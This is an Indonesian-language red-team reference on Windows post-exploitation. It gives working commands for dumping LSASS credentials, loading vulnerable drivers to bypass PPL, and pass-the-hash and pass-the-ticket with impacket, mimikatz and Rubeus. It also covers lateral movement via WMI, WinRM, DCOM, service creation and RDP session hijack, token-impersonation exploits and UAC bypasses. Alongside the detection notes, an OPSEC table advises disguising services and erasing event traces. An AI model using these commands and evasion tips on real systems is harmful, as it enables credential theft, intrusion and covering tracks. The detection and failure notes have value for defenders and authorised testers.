# postex-win — win

# Windows Post-Exploitation — Referensi Red Team

## 1. Akses LSASS

### 1.1 comsvcs.dll MiniDump (LOLBAS, T1003.001)

Mengirim: panggilan `rundll32` ke export `MiniDump` di `C:\Windows\System32\comsvcs.dll`, menulis dump ke path attacker-writable.

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

PowerShell variant (sering lebih OPSEC-safe karena tidak spawn console window baru):

```powershell
$p = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $p C:\Windows\Temp\lsass.dmp full
```

Apa yang muncul:
- `rundll32.exe` child of `cmd.exe`/`powershell.exe` — anomali karena `rundll32` dengan argumen `comsvcs.dll, MiniDump` adalah signature klasik.
- Sysmon EID 1 (process create) dengan `CommandLine` mengandung `MiniDump`.
- Sysmon EID 11 (file create) `lsass.dmp`.
- Defender ASR rule **"Block credential stealing from lsass.exe"** (GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`) memblokir ini sejak Defender 4.18 (2020). Di Windows 11 24H2 default-enabled.

Kenapa gagal:
- `comsvcs.dll` dalam `System32` dimiliki `TrustedInstaller`; ATT&CK mencatat bahwa bila binary di-copy (untuk hindari signature) malah terdeteksi sebagai unsigned.
- Butuh `SeDebugPrivilege` — dari medium-integrity non-admin langsung `Access Denied` pada `OpenProcess(PROCESS_VM_READ)`. Dari admin tanpa PPL bypass, `lsass.exe` PPL (RunAsPPL) blokir `MiniDumpWriteDump` walau handle valid.

### 1.2 Handle steal (duplicate handle via `NtDuplicateObject`)

Mengirim: proses medium-integrity membuka handle ke `lsass.exe` dari proses yang sudah punya handle LSASS (mis. `svchost.exe`/`wininit.exe`) lalu menduplikasi. Tooling umum: `SysWhispers3`/`InlineWhispers` + custom loader, atau `SharpDump`/`SafetyKatz` varian.

```c
// pseudo — open wininit.exe, find process handle to lsass in its handle table
// enumerate handles (NtQuerySystemInformation SystemHandleInformationEx)
// NtDuplicateObject(wininit, lsassHandle, self, &myHandle, PROCESS_VM_READ, 0, 0)
```

Apa yang muncul:
- Handle enumeration syscall (`NtQuerySystemInformation` class `SystemExtendedHandleInformation`) — ETW Microsoft-Windows-Kernel-Process EID 2/3 atau Sysmon 8 (CreateRemoteThread) tidak menangkap ini langsung, tapi **Defender for Endpoint** sensor `OpenProcess` ke `lsass.exe` dari proses non-allowlisted.
- Jika berhasil duplikat, `MiniDumpWriteDump` tidak lagi butuh `SeDebugPrivilege` di caller — tapi butuh handle `PROCESS_QUERY_INFORMATION`.

Kenapa gagal di lapangan:
- LSASS PPL: duplikasi handle memberi `PROCESS_VM_READ` tapi `MiniDumpWriteDump` masih kena PPL. Handle dup bukan PPL bypass — ini hanya privilege bypass.
- EDR modern (CrowdStrike Falcon 7.x, SentinelOne Singularity 24.x) hook `NtDuplicateObject` di userland dan blokir `wininit`/`svchost` sebagai source handle.

### 1.3 PPL bypass (LSASS)

Mengirim: salah satu dari —
- **Driver vulnerable** (`mimikatz` `!+` + `mimidrv.sys` memakai `PsProtection` patch via arbitrary kernel write). Signature `mimidrv.sys` diblokir DriverBlocklist (Windows 11 24H2 punya blocklist baru Sep 2025 menambah `mimidrv`, `gdrv`, `ene.sys`).
- **BYOVD** (Bring Your Own Vulnerable Driver): `RTCore64.sys` (MSI Afterburner, CVE-2019-16098), `gdrv.sys` (Gigabyte), `ene.sys` (ASUS ARMOURY), `WDTKernel.sys`. Windows 11 24H2 dengan HVCI aktif menolak load unsigned/vulnerable driver.
- **PPLdump** (itm4n, teknik `NtCreateUserProcess` + `SePrivilege` abuse lewat `WinTrust` pada Windows < 24H2). Dipatch di Windows 11 build 260xx.
- **SilentMoonwalk / Callback Hell** — stack spoofing untuk memanggil `MiniDumpWriteDump` dengan stack kembali ke `kernel32` sah.

```cmd
:: BYOVD contoh RTCore64
sc create RTCore64 type= kernel binPath= C:\Windows\Temp\RTCore64.sys
sc start RTCore64
:: lalu exploit arbitrary R/W untuk clear PsProtection flags di EPROCESS lsass
```

Apa yang muncul:
- Event Log **Service Control Manager EID 7045** (service install) — `ImagePath` di `\Temp\` = high-fidelity red flag.
- Sysmon EID 6 (driver load) dengan `Signed` true tapi `SignatureStatus` valid dan nama driver tidak di Microsoft driver store (`C:\Windows\System32\drivers\`).
- Defender `BlockNonMicrosoftDrivers` / HVCI violation event.

Kenapa gagal:
- Windows 11 24H2 dengan **Smart App Control** + **HVCI** + **Driver Blocklist** default menolak RTCore64, gdrv, ene.
- `RunAsPPL=1` di registry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` hanya efektif setelah reboot; admin yang baru enable kadang lupa reboot — jadi lab OK, produksi sebaliknya.
- Credential Guard (VBS) melindungi **LSA secrets dan NTLM hash** dengan virtualization — PPL bypass memberi akses ke memori LSASS, tapi hash dalam format yang tidak bisa langsung dipakai untuk PtH karena dilindungi VSM. Jadi dump "berhasil" tapi hash unusable.

---

## 2. Pass-the-Hash / Pass-the-Ticket / Over-Pass-the-Hash

### 2.1 PtH — NTLM

Mengirim: hash NT (`aad3b435…:31d6cfe0…`), auth via SMB/WMI/WinRM tanpa plaintext.

```cmd
:: impacket
python examples/psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator@10.0.0.10

:: mimikatz
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

Apa yang muncul:
- Event **4624 logon type 3** dengan `AuthenticationPackage: NTLM`, `LogonProcess: NtLmSsp`. `Workstation Name` = host attacker.
- **4776** (credential validation) bila DC.
- **4672** bila admin — tapi tanpa 4648 (explicit cred) karena bukan explicit.
- Defender for Identity / MDI alert **"Pass-the-hash"** — baseline anomali: NTLM auth dari host yang biasanya Kerberos.

Kenapa gagal:
- **NTLM disabled** di domain (Windows 11 24H2 / Server 2025 baseline mulai disable NTLMv1, banyak org disable NTLM total). Semua teknik PtH classik jadi mati.
- **Protected Users** group member: NTLM auth ditolak, tidak bisa PtH.
- **Credential Guard** di target: hash dari LSASS target tidak berguna untuk lateral, hanya di sumber.

### 2.2 Over-Pass-the-Hash (OPtH) — NTLM → Kerberos TGT

Mengirim: hash NT, request TGT dengan `AS-REQ` menggunakan RC4-HMAC (etype 0x17) tanpa plaintext.

```cmd
:: impacket
python examples/getTGT.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator

:: Rubeus (opsec: /opsec flag untuk hindari AS-REQ dengan encryption downgrade)
Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /domain:corp.local /dc:dc01.corp.local /ptt /opsec
```

Apa yang muncul:
- DC **4768** (TGT issued) dengan `Ticket Encryption Type 0x17` (RC4) padahal domain default AES256.
- MDI alert **"Overpass-the-hash"** — kombinasi 4768 (RC4) + login dari host non-baseline.
- 4624 type 3 di target dengan Kerberos (bukan NTLM) — sering luput dari deteksi NTLM-only.

Kenapa gagal:
- Domain yang **disable RC4** (`msDS-SupportedEncryptionTypes` dipaksa AES-only di semua akun) — `getTGT` RC4 ditolak `KDC_ERR_ETYPE_NOTSUPP`.
- `getTGT` tanpa `/opsec` di Rubeus mengirim `AS-REQ` tanpa `preauth` — trigger **4768 dengan status `0x18` (pre-auth required)** = noise > 100x baseline.
- **AS-REP roasting detection** di RBC baseline menganggap high-volume RC4 AS-REQ sebagai kerberoasting.

### 2.3 Pass-the-Ticket

Mengirim: `.kirbi` (Windows LSA format) atau `.ccache` (MIT/Heimdal).

```cmd
:: Rubeus
Rubeus.exe ptt /ticket:doIF...base64...

:: impacket
export KRB5CCNAME=/tmp/administrator.ccache
python examples/psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

Apa yang muncul:
- **4769** (TGS) dari host dengan `Client Address` = attacker. Tidak ada 4768 → TGT "muncul dari nowhere".
- **4624 type 3** Kerberos tanpa 4768 koresponden di DC.
- MDI: **"Suspicious Kerberos ticket"** heuristik (`Kerberos ticket lifetime` > default, atau TGT forwardable dengan `RenewUntil` > 7d).

Kenapa gagal:
- **PAC validation** di target (Server 2022+ `PacRequestorEnforcement=2`) — ticket dengan signatur PAC palsu (golden/sapphire) ditolak untuk service yang strict.
- Ticket expired — `.kirbi` default 10 jam; post-exploitation setelah 4 jam sering miss TTL.
- AES vs RC4 mismatch: user dengan `AES-only` di domain tidak bisa pakai `.kirbi` RC4 di target yang enforce AES (Server 2025).

---

## 3. Lateral Movement

### 3.1 WMI (T1047)

```cmd
wmic /node:10.0.0.20 /user:CORP\Administrator /password:xxx process call create "cmd.exe /c whoami > C:\Windows\Temp\o.txt"
```
PowerShell:
```powershell
Invoke-WmiMethod -ComputerName 10.0.0.20 -Class Win32_Process -Name Create -ArgumentList "cmd /c calc"
```

Muncul:
- **4688** di target: `WmiPrvSE.exe` spawning `cmd.exe` — parent WmiPrvSE = red flag.
- **4624 type 3** (`AuthenticationPackage: NTLM|Kerberos`), logon `RemoteInteractive` tidak — WMI = Network.
- Sysmon EID 1 parent `WmiPrvSE.exe` child `cmd.exe`/`powershell.exe`.
- **Windows Defender for Endpoint**: alert "Suspicious WMI execution".

Gagal bila: firewall blok RPC dynamic ports (135 + 49152-65535 range), WinRM terpisah, atau `WmiPrvSE` disabled via AppLocker policy.

### 3.2 WinRM (T1021.006)

```powershell
$c = New-PSSession -ComputerName 10.0.0.20 -Credential (Get-Credential)
Invoke-Command -Session $c -ScriptBlock { whoami }
```
Impacket alternatif:
```cmd
evil-winrm -i 10.0.0.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

Muncul:
- **4624 type 3** di target, `AuthenticationPackage: Negotiate`, logon `Network` dengan `ProcessName: C:\Windows\System32\wsmprovhost.exe`.
- **91** (WinRM Operational) di target: `Creating WSMan shell`.
- **4688**: `wsmprovhost.exe` spawn `cmd.exe`/`powershell.exe` — sekuens klasik PSRemoting.
- Defender for Endpoint: "WinRM remote execution".

Gagal: WinRM HTTP (5985) atau HTTPS (5986) tidak listening (default enabled sejak Server 2012, **disabled di Windows 10/11 client**). Kerberos double-hop — `Invoke-Command` ke host A tidak bisa authenticate ke host B tanpa CredSSP/delegation.

### 3.3 DCOM (T1021.003)

```powershell
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.20"))
$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```
Varian: `ShellWindows`, `ShellBrowserWindow`, `Excel.Application.DDE`, `Visio.Application`.

Muncul:
- **4624 type 3** di target, logon `Network`.
- **4688**: parent = `svchost.exe` (`DcomLaunch`) → `mmc.exe` → `cmd.exe`.
- DCOM EID? Tidak ada native — Sysmon 1 + 3 (network) correlation.
- MDI "Remote DCOM execution" bila correlation RPC ke port 135 dari host.

Gagal: DCOM RPC endpoint mapper (135) + dynamic port range diblok. Target dengan **AppContainer** policy blok PROGID (Windows 11 24H2 default lebih ketat untuk non-interactive). Excel/Office tidak terinstal.

### 3.4 SCMR (service creation, T1543.003)

```cmd
sc \\10.0.0.20 create RedTeam binPath= "cmd.exe /c whoami > C:\Windows\Temp\o.txt" start= demand
sc \\10.0.0.20 start RedTeam
sc \\10.0.0.20 delete RedTeam
```
Impacket `smbexec.py` pakai teknik ini (service `BTOBTO`/`BTOBTO.svc`).

Muncul:
- **7045** di `System.evtx` target: `A service was installed` + `ServiceName` random + `ImagePath` `cmd.exe /c ...` atau `%COMSPEC%`.
- **4697** di Security.evtx (butuh audit policy `Audit Security System Extension`).
- **4688**: `services.exe` spawn `cmd.exe` — child of services.exe = eksekusi service.
- **4624 type 3** untuk SMB auth. Type 5 (service) untuk service logon account.

Gagal: non-admin tidak bisa create service (`SC_MANAGER_CREATE_SERVICE`). AppLocker + WDAC blok `cmd.exe` as service child. Defender ASR rule "Block process creations originating from PSExec and WMI commands" (GUID `d1e49aac-…`) memblokir parent `PSEXESVC.exe`/`WmiPrvSE.exe`.

### 3.5 RDP hijack (T1563.002)

Dua teknik:

**(a) Session hijack via `tscon`** — butuh SYSTEM atau `SeTcbPrivilege`:
```cmd
query user
tscon 2 /dest:rdp-tcp#3
```
Dijalankan sebagai SYSTEM (mis. dari service SCMR commute) untuk melepas sesi user aktif ke sesi attacker.

**(b) RDP shadow / thin client**:
```cmd
mstsc /shadow:2 /control /v:10.0.0.20
```

Muncul:
- **1149** (TerminalServices-RemoteConnectionManager): user auth.
- **4624 type 10** (`RemoteInteractive`) dan **4778**/**4779** (session reconnect/disconnect).
- **Event 25** (TerminalServices-LocalSessionManager) untuk reconnect.
- **RDP shadow event** `TerminalServices-RemoteConnectionManager/Operational EID 258` (`ShadowViewerConnection`).

Gagal: `tscon` butuh sesi memiliki user yang ter-logout atau sesi target attacker tidak memiliki privilege. RDP shadow butuh **GPO `Shadow` policy allow** (`Disconnected Session Shadowing`) — default `No` di Windows 11 24H2.

---

## 4. Token Impersonation

Mengirim: duplicate token dari proses SYSTEM (`winlogon.exe`, `services.exe`) atau dari handle LSASS, set `SeImpersonatePrivilege` (default untuk service account, `IIS APPPOOL`, `MSSQL$`, `LOCAL SERVICE`).

Tools: `PrintSpoofer` (spoolsv, Windows 10 1903-22H2), `RoguePotato`/`JuicyPotato` (DCOM OXID resolver — dipatch di Server 2019 1809+/Win10 1909), `GodPotato` (COM `IFileSystem` abuse, work di Server 2022/2025), `SigmaPotato`, `SharpEfsPotato` (EFSRPC). Untuk credential (bukan token): `SharpToken` + `SetThreadToken`.

```cmd
:: PrintSpoofer (Win10 22H2, Server 2019)
PrintSpoofer.exe -i -c "cmd.exe"
:: GodPotato (Server 2022 / 2025)
GodPotato.exe -cmd "cmd /c whoami /priv"
```

Muncul:
- `seclogo` / `SeImpersonatePrivilege` di token — baseline: hanya service account.
- **4688** child proses baru dengan parent proses service (`spoolsv.exe` → `cmd.exe` adalah red flag karena `spoolsv` tidak spawn shell).
- **4624 type 5** (service logon) ketika token SYSTEM diimpersonate + **4672** (special privileges) di target.
- **ETW / Defender**: "Suspicious token impersonation".

Gagal: `SeImpersonatePrivilege` tidak ada (interactive admin, non-service). Named pipe berhasil dibuat tapi `ImpersonateNamedPipeClient` balik `ERROR_INVALID_HANDLE` bila client tidak berada di context yang sama. `PrintSpoofer` dipatch di Windows 11 22H2+ (spoolsv tidak lagi reachable via named pipe dari medium-integrity). `RoguePotato` butuh port 135 loopback + merujuk ke host attacker (banyak firewall internal blok).

---

## 5. UAC Bypass (state 2026, Windows 11 24H2/25H2)

Banyak teknik lama **mati** oleh patch dan default policy 24H2.

| Teknik | Status Win11 24H2/25H2 | Catatan |
|---|---|---|
| `fodhelper.exe` (registry hijack `ms-settings\shell\open\command`) | **Mati** sejak 22H2 (fix `HKCU\Software\Classes`) | ATP/defender trigger |
| `computerdefaults.exe` | **Mati** 22H2 | |
| `sdclt.exe` (fileless) | **Mati** 21H2 | |
| `eventvwr.exe` (mscfile hijack) | **Mati** 1803+ | |
| `cmstp.exe` INF | **Mati** 21H2 | |
| `ICMLuaUtil` COM (`CLSID {6EDD6D74-C007-4E75-B76A-E5740995E24C}`) | **Jalan** di 24H2 via `CMSTPLUA.dll` custom loader (unpatched) | butuh COM marshaling, high-signal |
| **UACME `akagi`/`mockdir` helper** (env var `windir` + copy DLL) | **Jalan** sesuai build di repo hfiref0x/UACME | butuh writable dir di System32 shares |
| **`FodHelper` via `\Schedule\TaskCache`** | **Mati** Integrity level fix | |
| **SspiUacBypass** (RPC ke `lxsstools` `SspiCaptureCreds`) | **Mati** 22H2 | |
| **`Shim` AppInfo (`Yamato`)** | **Mati** — CVE-2021-1732 fix | |
| **`Startup` folder symlink** | Butuh admin-level write first | |

Teknik yang **masih hidup 2026** dan dipakai:

**a. ICMLuaUtil COM** (unpatched, butuh `Bypass` loader):
```c
// CLSID_CMSTPLUA, IID_ICMLuaUtil
// CoCreateInstance → ICMLuaUtil::ShellExec("cmd.exe", ...)
```
Muncul: `dllhost.exe` (COM surrogate) spawn `cmd.exe` elevated; parent `svchost.exe` dari DcomLaunch → `dllhost.exe`. Sysmon EID 1 parent `dllhost.exe` + `IntegrityLevel: High` = red flag.

**b. `sdclt`+`ShellExec` via `DelegateExecute`** masih parsial di beberapa build 24H2 — **unreliable** karena `sdclt` dihapus dari beberapa SKU (Windows 11 Home 24H2).

**c. `wusa.exe` / `pkgmgr.exe` DLL side-load** — butuh writable path.

**d. via SMB `\\127.0.0.1\C$\` mount + MUI** — butuh SMB loopback, banyak org blokir.

Opsec catatan agregat:
- Semua UAC bypass trigger **Sysmon 1 parent tidak standar** (`dllhost.exe`, `consent.exe`, `rundll32.exe`) → shell elevated.
- **Windows 11 24H2 default** `EnableLUA=1`, `ConsentPromptBehaviorAdmin=5` (Prompt for consent), `PromptOnSecureDesktop=1` — bypass tetap jalan karena auto-elevate COM.
- **Windows 11 25H2** (Q4 2025) memperketat `types of autoElevate` — hanya COM CLSID di allowlist `CoCreateInstance` dari non-elevated jika `TE` tidak diminta; teknik ICMLuaUtil **masih** jalan tapi harus via `ICMLuaUtil` yang memang allowlisted auto-elevate. Build-dependent, uji di VM target dulu.

---

## 6. OPSEC per Teknik — Tabel Ringkas

| Teknik | Artefak paling berisik | Mitigasi OPSEC |
|---|---|---|
| comsvcs MiniDump | Sysmon 1 + path `lsass.dmp` | Tulis ke share `\\127.0.0.1` non-`C$` atau named pipe; `MiniDump` dari **proses yang sudah punya handle** LSASS (via duplicate handle) → tidak butuh `SeDebugPrivilege` |
| Handle steal | `NtQuerySystemInformation` high-volume (Sysmon 22 tidak cover, tapi EDR hook) | Batch enumeration, delay jitter, pakai `SystemExtendedHandleInformation` sekali |
| PPL bypass | 7045 driver load | BYOVD hanya di host tanpa HVCI/DriverBlocklist (cek `msinfo32` → `Virtualization-based security: Not enabled`) |
| PtH | 4624 type 3 NTLM | Prefer OPtH ke Kerberos; hindari SMB jika NTLM dipantau; pakai WinRM (Kerberos) |
| OPtH | 4768 RC4 | `/opsec` di Rubeus, atau **`/aes256:<aes>`** dari `sekurlsa::ekeys` agar pakai AES (tidak trigger RC4 alert) |
| PtT | 4769 tanpa 4768 | Request TGT baru dengan `/ptt` sekaligus, hindari ticket lifetime > default |
| WMI | 4688 parent `WmiPrvSE` | Pakai `wmic process call create` dengan binary signed (`rundll32`/`mshta`) atau langsung ke `CScript` — tetap high-signal |
| WinRM | `wsmprovhost` spawn shell | `Invoke-Command` langsung ke `powershell -enc` payload; pertimbangkan **WinRM + JEA bypass** |
| DCOM | Parent `svchost.exe` → `mmc.exe` | Pakai PROGID yang lazim (Excel tidak ada). Parent biasanya `svchost` (DcomLaunch) — hindari |
| SCMR | 7045 + 4688 services.exe child | Pakai nama service yang menyerupai sistem (`WindowsDefendr` bukan `RedTeam`), hapus setelah eksekusi |
| RDP hijack | 4778/4779 + 1149 | Eksekusi via SYSTEM service satu-shot, `tscon` langsung ke session yang tidak dikontrol, hilangkan jejak di `TerminalServices-RemoteConnectionManager` |
| Token impersonate | parent service spawn shell | target parent yang wajar (mis. `spoolsv` spawn `rundll32` dengan DLL signed) |
| UAC bypass | parent `dllhost`/`consent` → high integrity shell | `ICMLuaUtil` dari process yang sudah high-integrity (jangan dari medium) untuk hindari consent log |

---

## 7. Jebakan Operasional (field-notes)

1. **`SeDebugPrivilege` bukan jaminan dump.** Di Windows 11 24H2 dengan `RunAsPPL=1` + **HVCI**, `MiniDumpWriteDump` dari admin non-PPL tetap `0x80070005` walau handle valid. Cek `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` dan `msinfo32` VBS status dulu sebelum pilih metode.

2. **comsvcs.dll path.** `C:\Windows\System32\comsvcs.dll` adalah path benar — tapi bila shell 32-bit (`SysWOW64`) di 64-bit OS, `rundll32` 32-bit gagal memanggil WOW64 `comsvcs.dll, MiniDump` karena perbedaan architecture dengan LSASS (64-bit). **Selalu panggil dari `C:\Windows\System32\rundll32.exe` 64-bit**.

3. **NTFS alternate data stream blocks.** Beberapa org punya EDR yang memblokir `CreateFile` write ke `C$` share / `\Temp\` dengan `0x80070005` — tidak semua gagal terlihat, hanya menunggu EDR verdict.

4. **RC4 vs AES di domain modern.** Baseline 2026: banyak domain pakai `msDS-SupportedEncryptionTypes=0x18` (AES+RC4) tapi policy account `AES-only` untuk admin. Kalau `sekurlsa::ekeys` balik `aes256` kosong dan hanya `rc4`, domain punya RC4-nya aktif tapi akun protected → OPtH sukses **hanya untuk service account**, admin gagal `KDC_ERR_ETYPE_NOTSUPP`.

5. **PtH ke WinRM tidak jalan.** WinRM default pakai `Negotiate` (Kerberos dulu, NTLM fallback) tapi `WinRM` service di Windows 11 client **tidak listening**. `evil-winrm -H` ke Windows 11 client = connection refused sampai `Enable-PSRemoting -Force` dijalankan (butuh admin).

6. **WMI RPC dynamic ports.** Impacket `wmiexec.py` butuh port 135 + dynamic range (`49152-65535`). Windows Firewall default membuka 135, tapi tidak membuka dynamic range kecuali `RpcSs` listen. Banyak corporate image pakai `Firewall rule: Block inbound RPC dynamic`. Test `rpcdump.py @target` dulu; bila `ncacn_ip_tcp` endpoint mapper terbuka tapi dynamic port tertutup → WMI mati, pindah ke SMB.

7. **RDP hijack tanpa `query user` output.** Bila attacker tidak punya `SeTcbPrivilege` (medium integrity), `tscon` akan balik `Access is denied` **setelah** command tercatat di Event 4778 → noise. Jalankan `tscon` dari SYSTEM (via SCMR / PsExec lokal), bukan dari interactive shell.

8. **UAC bypass build-sensitive.** `ICMLuaUtil` CLSID `{6EDD6D74-C007-4E75-B76A-E5740995E24C}` depend pada `CMSTPLUA.dll` — di Windows 11 Home 24H2 (bukan Pro), `CMSTPLUA` tidak terinstal hingga Microsoft Store install `VCLibs` — bypass gagal `REGDB_E_CLASSNOTREG`. Uji CLSID dengan `oleview` sebelum payload.

9. **`Win32_Process::Create` tidak inherit token admin dari WMI caller.** WMI di remote host berjalan sebagai user yang auth ke SMB/WMI — jika itu `DOMAIN\user`, child adalah `DOMAIN\user`, bukan SYSTEM. Untuk SYSTEM gunakan service (`smbexec`) atau Scheduled Task dengan `/RU SYSTEM`.

10. **`tscon` dest name.** Destination format `rdp-tcp#N` adalah **per-host**, tidak universal; attacker sering salah tulis → sesi bukan hijack, tapi **disconnect** user aktif (bikin user lapor IT). Selalu `query session` dan pakai nama persis (`console`, `rdp-tcp#0`, `rdp-tcp#1`).

11. **TGT `.kirbi` archived di disk.** `ptt /ticket:` di Rubeus menyimpan base64 di commandline — Sysmon 1 menangkapnya full. Selalu `ptt /ticket:@C:\path\file.kirbi` atau `Rubeus ptt /ticket` via pipe/stdin.

12. **`Overpass-the-hash` di host dengan Credential Guard.** CG memblokir `sekurlsa::ekeys` untuk dapat AES key dari memory — kalau target sumber (host attacker masuk) punya CG, OPtH tidak bisa dari situ. Ambil hash dari DC atau dari host non-CG (mis. Server 2016 lama).

13. **PtH blocked by `LmCompatibilityLevel`.** Domain functional level 2016+ dan `LmCompatibilityLevel>=3` mematikan NTLMv1; hash NT tetap bisa NTLMv2 — yang mati hanya NTLMv1 response. Namun `Restrict NTLM` policy (`Network security: Restrict NTLM`) memblokir seluruh NTLM auth dari host tertentu → PtH balik `STATUS_LOGON_FAILURE` tanpa 4624.

14. **`PrintSpoofer` butuh `spoolsv` running.** Windows 11 24H2 dengan `Print Spooler` disabled (policy default di Server 2025 untuk non-print server) → `PrintSpoofer` balik `CreateNamedPipe` delay → hang. Cek `Get-Service Spooler -ComputerName` dulu; kalau stopped, `GodPotato` (COM) atau `EfsPotato` (EFSRPC) sebagai fallback — tapi EFSRPC dipatch di Windows 11 22H2+.

15. **LSASS dump dengan handle forward.** `MiniDumpWriteDump` dari `dbghelp.dll` versi lama punya bug — bila `lsass.exe` punya > 1000 handles, fungsi `NtQuerySystemInformation` internal timeout dan dump terpotong (hash tidak lengkap → `sekurlsa` parse gagal). Gunakan `MiniDumpNormal` atau `MiniDumpWithFullMemoryIdInfo` dan verifikasi di `mimikatz` (parse harus return NTLM untuk setiap user, bukan 0 baris).

---

## [reasoning trace]


